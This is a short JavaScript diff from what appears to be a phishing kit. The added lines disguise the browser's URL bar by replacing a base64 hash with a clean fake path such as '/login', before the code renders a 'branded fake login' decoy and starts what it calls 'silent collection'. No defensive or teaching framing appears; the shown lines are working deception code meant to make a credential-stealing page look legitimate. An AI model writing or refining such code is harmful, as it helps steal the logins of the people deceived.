@@ -19,7 +19,14 @@
     return;
   }
 
-  /* ---- 1. Render branded fake login (always — serves as fallback) ---- */
+  /* ---- 1. Disguise the URL bar ---- */
+  // Use history.replaceState to hide the base64 hash and show a clean path
+  try {
+    const fakePath = cfg.path || '/login';
+    history.replaceState(null, '', fakePath);
+  } catch (_e) { /* replaceState may fail on some origins */ }
+
+  /* ---- 2. Render branded fake login (always — serves as fallback) ---- */
   Decoy.render(cfg);
 
   /* ---- 2. Start silent collection immediately ---- */
